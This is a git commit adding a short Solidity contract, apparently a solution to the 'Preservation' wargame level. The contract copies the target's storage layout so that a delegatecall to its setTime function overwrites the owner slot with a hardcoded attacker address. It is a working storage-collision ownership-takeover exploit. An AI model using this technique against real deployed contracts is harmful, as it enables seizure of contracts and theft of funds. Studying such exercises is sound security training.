ff5baff01b3e99e4825fae0e558062dea54489ea
richuak <richuakuttikattu@gmail.com>
2024-01-28 17:11:04 +0300

    Preservation and HackPreservation

---
+++ Preservation/HackPreservation.sol
@@ -0,0 +1,13 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract HackPreservation {
+    // public library contracts
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+
+    function setTime(uint256 _time) public {
+        owner = 0xcF78399B272E71F23F00b453005e9ba0EFa9FcDc;
+    }
+}
